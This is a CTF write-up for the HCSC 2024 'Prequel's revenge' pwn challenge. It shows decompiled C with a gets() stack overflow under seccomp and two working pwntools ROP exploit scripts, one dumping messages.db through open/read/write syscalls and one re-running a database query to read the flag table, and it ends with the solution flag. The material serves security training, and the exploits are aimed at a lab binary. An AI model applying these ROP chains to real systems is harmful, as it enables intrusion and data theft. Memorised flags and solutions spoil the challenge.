# HCSC 2024 - Prequel's revenge

## Description

💀 Mi udvariasan köszönünk neked és te ellopod a flaget?! Ennyit számít számodra a becsületesség? Hát hol a határ? Szerencsére megvan a hálózati naplókból, hogy hogy csináltad. Úgy tűnik manapság nem hagyhat az ember debugra használt függvényeket a kódjában anélkül, hogy valami jótevő ki ne használná azt... Megjegyeztem! És persze megszabadultam tőle. Mostantól biztonság és nyugalom van! Igen, neked is jó reggelt... 😮‍💨

Készítői kommentek:
* a megoldáshoz szerver oldali brute-force nem szükséges
* VPN kapcsolat szükséges
* A jelenlegi `challenge.zip` sha256sum hash-e: `969ab54989be1bbc1f44464a3d0f87851faf9db6dd60369673a2e50b557a6320`
* a challenge egyetlen porton fut

**Flag formátum**: `HCSC24{...}`

*By MJ*

> Hint 1 (cost 200): Itt biza nincs SELECT flag FROM flag... Talán a .bss segíthet? https://en.wikipedia.org/wiki/.bss

## Metadata

- Tags: `buffer overflow`, `stack overflow`, `return-oriented programming`, `ROP`
- Points: `400`
- Number of solvers: `9`
- Filename: [`prequels_revenge`](files/prequels_revenge), [`challenge.zip`](files/challenge.zip)

## Solution

**The `Prequel` and `Prequel's revenge` can be solved with the same script just maybe changing some addresses. The only difference in the challenges is that in `Prequel` there is a `print_debug_flag` function which makes the task a bit easier.**

We can decompile the binary with `IDA Free` or `Ghidra`, the most important parts are the following:

```c
__int64 __fastcall read_name(__int64 a1)
{
  puts("Enter your name: ");
  return gets(a1);
}

__int64 __fastcall get_message(__int64 a1, __int64 a2)
{
  int v2; // eax
  int v3; // r8d
  int v4; // r9d
  int v5; // eax
  int v6; // r8d
  int v7; // r9d
  unsigned int v8; // eax
  int v9; // eax
  int v10; // r8d
  int v11; // r9d
  __int64 v12; // rax
  __int64 v14; // [rsp+0h] [rbp-30h]
  __int64 v15; // [rsp+18h] [rbp-18h] BYREF
  __int64 v16; // [rsp+20h] [rbp-10h] BYREF
  int v17; // [rsp+2Ch] [rbp-4h]

  v14 = a2;
  v17 = sqlite3_open("messages.db", &v16);
  if ( v17 )
  {
    v2 = sqlite3_errmsg(v16);
    fprintf((_DWORD)stderr,(unsigned int)"Cannot open database: %s\n", v2, (unsigned int)"Cannot open database: %s\n", v3, v4, a2);
    sqlite3_close(v16);
  }
  v17 = sqlite3_prepare_v2(v16, a1, 0xFFFFFFFFLL, &v15, 0LL);
  if ( v17 )
  {
    v5 = sqlite3_errmsg(v16);
    fprintf((_DWORD)stderr, (unsigned int)"Failed to prepare statement: %s\n", v5, (unsigned int)"Failed to prepare statement: %s\n", v6, v7, v14);
    sqlite3_close(v16);
  }
  v8 = j_strlen_ifunc(v14);
  v17 = sqlite3_bind_text(v15, 1LL, v14, v8, 0LL);
  if ( v17 )
  {
    v9 = sqlite3_errmsg(v16);
    fprintf((_DWORD)stderr, (unsigned int)"Failed to bind text: %s\n", v9, (unsigned int)"Failed to bind text: %s\n", v10, v11, v14);
    sqlite3_close(v16);
  }
  while ( 1 )
  {
    v17 = sqlite3_step(v15);
    if ( v17 != 100 )
      break;
    v12 = sqlite3_column_text(v15, 0LL);
    puts(v12);
  }
  sqlite3_finalize(v15);
  return sqlite3_close(v16);
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4[64]; // [rsp+0h] [rbp-40h] BYREF
  ignore_me_init_signal(argc, argv, envp);
  init_buffering();
  disable_exec_syscall();
  print_version();
  read_name(v4);
  puts("Fetching your message...");
  get_message("SELECT message FROM messages WHERE name=?;", v4);
  seccomp_release(ctx);
  return 0;
}
```

As we can see, there is a `gets` call in `read_name` to a 64-byte long buffer in `main`. This is a simple buffer overflow challenge, with `NX`-bit set so we cannot execute the stack and the `execve` (`59`) and `execveat` (`322`) syscalls are disabled using `seccomp`:

```c
__int64 disable_exec_syscall()
{
  int v0; // r8d
  int v1; // r9d
  int v2; // r8d
  int v3; // r9d

  ctx = seccomp_init(2147418112LL);
  seccomp_rule_add(ctx, 0, 59, 0, v0, v1);
  seccomp_rule_add(ctx, 0, 322, 0, v2, v3);
  return seccomp_load(ctx);
}
```

The goal is to get the `flag` from the `flag` table of the `messages.db` SQLite3 database.

The `open`, `read` and `write` `syscalls` are not disabled so we can theoretically write a ROP-chain to `open` `messages.db`, `read` all of its contents and `write` them out to ourselves.

To open the database (creating a file descriptor) (check the respective manuals)
- `RAX` should be `2`, which is the number of the `open` `syscall`
- `RDI` should be a pointer to the filename string (`messages.db`)
- `RSI` should be `0`, which means `O_RDONLY` (we want to read from the file)

To read the database:
- `RAX` should be `0`, which is the number of the `read` `syscall`
- `RDI` should be the file descriptor number returned by the previous `open` (likely `3` if no other files are open by the process)
- `RSI` should point to a writeable buffer, for example the address of the `.data` section
- `RDX` should be the number of bytes we want to read to the buffer

The write to content to `stdout`:
- `RAX` should be `1`, which is the number of the `write` `syscall`
- `RDI` should be the file descriptor number of `stdout` which is `1`
- `RSI` should point to the buffer where the data is stored
- `RDX` should be the number of bytes we want to write to `stdout`

Using `ROPGadget` we can find the necessary ROP gadgets to create a ROP chain which does exactly the previous steps ([`solve.py`](files/solve.py)):

```python
from pwn import *
from struct import pack
import re

# ROPgadget --binary ./out/prequels_revenge | grep "pop rdx ; pop rbx ; ret"

# Padding
p = b'a'*(64+8)

POP_RSI_RET =         0x0000000000401e54
POP_RDI_RET =         0x0000000000401e52
XOR_RAX_RAX_RET =     0x000000000052cca0
POP_RAX_RET =         0x00000000004c6d15
SYSCALL =             0x000000000053D785
POP_RDX_POP_RBX_RET = 0x000000000051400e
DATA_SECTION =        0x000000000063a140

MESSAGESDB =          0x00000000005A007F

CONST_0 =             0x0000000000000000
CONST_1 =             0x0000000000000001
CONST_2 =             0x0000000000000002
CONST_3 =             0x0000000000000003
CONST_LARGE =         0x0000000000003000

# 1/ open file
# open(pathname, flags)
# rax = 0x02, rdi = filename, rsi = flags
p += pack('<Q', POP_RSI_RET)
p += pack('<Q', CONST_0) # rsi = 0
p += pack('<Q', POP_RDI_RET)
p += pack('<Q', MESSAGESDB) # rdi = "messages.db"
p += pack('<Q', XOR_RAX_RAX_RET)
p += pack('<Q', POP_RAX_RET)
p += pack('<Q', CONST_2) # rax = 2
p += pack('<Q', SYSCALL) # syscall

# 2/ read(fd, addr, count)
# rax = 0x00, rdi = fd, rsi = writeable_buffer, rdx = count
p += pack('<Q', POP_RDX_POP_RBX_RET)
p += pack('<Q', CONST_LARGE) # rdx = 0x3000
p += pack('<Q', CONST_0)
p += pack('<Q', POP_RSI_RET)
p += pack('<Q', DATA_SECTION) # rsi = @ .data
p += pack('<Q', POP_RDI_RET)
p += pack('<Q', CONST_3) # rdi = 3 (our file descriptor will be most likely 3)
p += pack('<Q', POP_RAX_RET)
p += pack('<Q', CONST_0) # rax = 0
p += pack('<Q', SYSCALL)

# 3/ write(fd, addr, count) to STDOUT
# rax = 0x01, rdi = fd, rsi = writeable_buffer, rdx = count
p += pack('<Q', POP_RDX_POP_RBX_RET) # pop rdx ; pop rbx ; ret
p += pack('<Q', CONST_LARGE) # rdx = 0x3000
p += pack('<Q', CONST_0)
p += pack('<Q', POP_RSI_RET)
p += pack('<Q', DATA_SECTION) # rsi = @ .data
p += pack('<Q', POP_RDI_RET)
p += pack('<Q', CONST_1) # rdi = 1
p += pack('<Q', XOR_RAX_RAX_RET)
p += pack('<Q', POP_RAX_RET)
p += pack('<Q', CONST_1) # rax = 1
p += pack('<Q', SYSCALL)

c = remote('10.10.6.12', 10990)

c.sendlineafter('Enter your name: \n', p)
c.recvuntil('Fetching your message...\n')
dump = c.recvuntil('Segmentation fault')
open('messages.db', 'wb').write(dump)
m = re.search(b'HCSC24{.*}',dump)
if m is not None:
    print(m.group().decode())
```

We can basically save the whole database and read the flag from it ([`messages.db`](files/messages.db)).

```
$ python solve.py 
[+] Opening connection to 10.10.6.12 on port 10990: Done
HCSC24{h0pe_y0u_u53d_the_str1nG_1n_pR3qu3l_4nd_n0t_b0ring_r34d}
[*] Closed connection to 10.10.6.12 port 10990

$ file messages.db 
messages.db: SQLite 3.x database, last written using SQLite version 3045002, file counter 6, database pages 3, cookie 0x2, schema 4, UTF-8, version-valid-for 6

$ sqlite3 messages.db 
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
flag      messages
sqlite> select * from flag;
HCSC24{h0pe_y0u_u53d_the_str1nG_1n_pR3qu3l_4nd_n0t_b0ring_r34d}
```

> Fun fact: The binary was manually modified, so that `checksec` would print that there is a stack canary. However, there is not.

```
$ checksec --file prequels_revenge 
[*] '/data/prequels_revenge'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`12boti` (who achieved overall 6th place and junior 2nd place, gg!) solved the challenge with this amazingly short script. He basically creates a ROP chain to execute `SELECT * FROM flag WHERE 1!=?;` instead of `SELECT message FROM messages WHERE name=?;` on the database (and handles the prepared statement parameter correctly).

```python
import pwn
exe = pwn.ELF("./prequels_revenge")
pwn.context.binary = exe

stmt = "SELECT * FROM flag WHERE 1!=?;"
target = exe.bss(0x100)

rop = pwn.ROP(exe)
rop.gets(target)
rop.get_message(target, target)

r = pwn.remote("10.10.7.12", 10990)
r.sendline(b"Alice".ljust(72, b"\00") + rop.chain())
r.sendline(stmt)
r.interactive()
```

The official write-up by `MJ` is available at: <https://github.com/NIK-SOC/hcsc_2024_mj/tree/main/ctf-prequels_revenge>

Flag: `HCSC24{h0pe_y0u_u53d_the_str1nG_1n_pR3qu3l_4nd_n0t_b0ring_r34d}`